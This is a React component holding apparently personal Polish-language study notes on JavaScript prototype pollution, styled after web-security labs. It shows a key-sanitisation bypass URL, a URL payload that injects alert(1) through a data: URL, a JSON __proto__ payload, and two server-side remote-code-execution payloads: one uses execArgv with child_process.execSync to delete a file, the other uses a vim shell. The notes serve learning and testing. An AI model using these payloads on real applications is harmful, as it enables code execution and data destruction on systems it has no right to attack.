import ExampleFrame from '../../exampleFrame/ExampleFrame';
import proto_1 from '../../../assets/proto_1.png';
import proto_2 from '../../../assets/proto_2.png';
import proto_3 from '../../../assets/proto_3.png';
import proto_4 from '../../../assets/proto_4.png';
import proto_5 from '../../../assets/proto_5.png';
import proto_6 from '../../../assets/proto_6.png';
import proto_7 from '../../../assets/proto_7.png';
import proto_8 from '../../../assets/proto_8.png';
import proto_9 from '../../../assets/proto_9.png';
import proto_10 from '../../../assets/proto_10.png';
import proto_11 from '../../../assets/proto_11.png';
import proto_12 from '../../../assets/proto_12.png';
import proto_13 from '../../../assets/proto_13.png';
import proto_14 from '../../../assets/proto_14.png';


const Prototype = () =>{
    return (
        <section>
            <h1>Prototype __proto__</h1>
            <ExampleFrame screen={proto_1} />
            <p>Każdy obiekt ma specjalną właściwość, której możesz użyć, aby uzyskać dostęp do jego prototypu. Chociaż nie ma ona formalnie ujednoliconej nazwy, <span className='important'>__proto__</span> jest de facto standardem używanym przez większość przeglądarek. Jeśli znasz języki obiektowe, ta właściwość służy zarówno jako getter, jak i setter dla prototypu obiektu. Oznacza to, że możesz jej użyć do odczytania 
                prototypu i jego właściwości, a nawet ponownego przypisania ich, jeśli to konieczne. Jak w przypadku każdej właściwości, możesz uzyskać dostęp do <span className='important'>__proto__</span>, używając notacji nawiasowej lub kropkowej:</p>
            <ExampleFrame screen={proto_2} />
            <p>Źródła zanieczyszczeń prototypu. Źródłem zanieczyszczeń prototypu jest każde kontrolowane przez użytkownika wejście, które umożliwia dodawanie dowolnych właściwości do obiektów prototypu. Najczęstsze źródła to:</p>
            <ul>
                <li className='important'>Adres URL za pośrednictwem zapytania lub ciągu fragmentu (hash)</li>
                <li className='important'>Wejście oparte na JSON</li>
                <li className='important'>Wiadomości internetowe</li>
            </ul>

            <details>
                <summary>Prototype pollution przez constructor</summary>
                <p><span className='important'>Ponieważ myObject.constructor.prototype jest równoważne myObject.__proto__, stanowi to alternatywny wektor dla zanieczyszczenia prototypów.</span></p>
                <ExampleFrame screen={proto_7} />

            </details>

            <details>
                <summary>Omijanie wadliwej dezynfekcji kluczy</summary>
                <div className='waring'>
                    <p>https://vulnerable-website.com/<span className='important'>?__pro__proto__to__.gadget=payload</span></p>
                    <p>Jeśli proces dezynfekcji po prostu usunie ciąg __proto__ i nie powtórzy tego procesu więcej niż raz, wynikiem będzie następujący adres URL, który jest potencjalnie wiarygodnym źródłem zanieczyszczenia prototypu:</p>
                    <p>https://vulnerable-website.com/<span className='important'>?__proto__.gadget=payload</span></p>
                </div>
            </details>

            <details>
                <summary>Prototyp zanieczyszczenia poprzez adres URL</summary>
                <p>Korzystając z kontrolek debugera przeglądarki, przejrzyj każdą fazę wykonywania, aby sprawdzić, czy właściwość została przekazana do odbiornika, takiego jak <span className='important'>innerHTML</span> lub <span className='important'>eval()</span>.</p>
                <div className='waring'>
                    <p>https://vulnerable-website.com/<span className='important'>?__proto__[evilProperty]=payload</span></p>
                    <p>https://vulnerable-website.com/<span className='important'>?__proto__.evilProperty = payload</span></p>
                    <br/>
                    <p>Przykład</p>
                    <p>https://vulnerable-website.com/<span className='important'>?__proto__[transport_url]=data:,alert(1);//</span></p>
                </div>
            </details>
            <details>
                <summary>Prototyp zanieczyszczenia poprzez adres JSON</summary>
                <p>Obiekty kontrolowane przez użytkownika są często wyprowadzane z ciągu JSON za pomocą metody <span className='important'>JSON.parse()</span>. Co ciekawe, <span className='important'>JSON.parse()</span> traktuje również dowolny klucz w obiekcie JSON jako dowolny ciąg, w tym rzeczy takie jak <span className='important'>__proto__</span>. Stanowi to kolejny potencjalny wektor zanieczyszczenia prototypu.</p>
                <div className='waring'>
                    <p>{`{`}</p>
                    <p className='tab-1'>{`"__proto__": {`}</p>
                    <p className='tab-2'>{`"evilProperty": "payload"`}</p>
                    <p className='tab-1'>{`}`}</p>
                    <p>{`}`}</p>
                </div>
            </details>
            <details>
                <summary>Client-side prototype</summary>
                <ExampleFrame screen={proto_3} />
                <ExampleFrame screen={proto_4} />
                <ExampleFrame screen={proto_5} />
                <ExampleFrame screen={proto_6} />
            </details>
            <details>
                <summary>Prototype pollution przez fetch()</summary>
                <ExampleFrame screen={proto_8} />
                <ExampleFrame screen={proto_9} />
            </details>

            <details>
                <summary>Server-side prototype</summary>
                <p>Żądania POST lub PUT, które przesyłają dane JSON do aplikacji lub API, są głównymi kandydatami do tego typu zachowania, ponieważ serwery często odpowiadają reprezentacją JSON nowego lub zaktualizowanego obiektu. W takim przypadku możesz spróbować zanieczyścić globalny Object.prototype dowolną właściwością w następujący sposób:</p>
                <ExampleFrame screen={proto_10} />
                <ExampleFrame screen={proto_11} />
                <p>Najczęstsze możliwość nadpisania prototype</p>
                <ul>
                    <li className='important'>Status code override</li>
                    <ExampleFrame screen={proto_12} />
                    <li className='important'>JSON spaces override - USTAWIĆ RESPONSE NA RAW BY ZOBACZYĆ RÓŻNICĘ !!!</li>
                    <ExampleFrame screen={proto_13} />
                    <ExampleFrame screen={proto_14} />
                    <li className='important'>Charset override</li>
                </ul>
            </details>

            <details>
                <summary>Remote code execution - child_process</summary>
                <div className='waring'>
                    <p>{`"__proto__": {`}</p>
                    <p className='tab-1'>{`"execArgv":[`}</p>
                    <p className='tab-2'>{`"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"`}</p>
                    <p className='tab-1'>{`]`}</p>
                    <p>{`}`}</p>
                </div>
            </details>

            <details>
                <summary>Remote code execution - vim</summary>
                <div className='waring'>
                    <p>{`"__proto__": {`}</p>
                    <p className='tab-1'>{`"shell":"vim",`}</p>
                    <p className='tab-1'>{`"input":":! <command>`}\n"</p>
                    <p>{`}`}</p>
                    <br />
                    <p>Vim ma interaktywny monit i oczekuje, że użytkownik naciśnie <span className='important'>Enter</span>, aby uruchomić podane polecenie. W rezultacie <span className='important'>musisz to symulować, umieszczając znak nowej linii (\n) na końcu swojego ładunku</span>, jak pokazano w przykładzie powyżej.</p>
                </div>
            </details>
            
            
        </section>
    )
}

export default Prototype;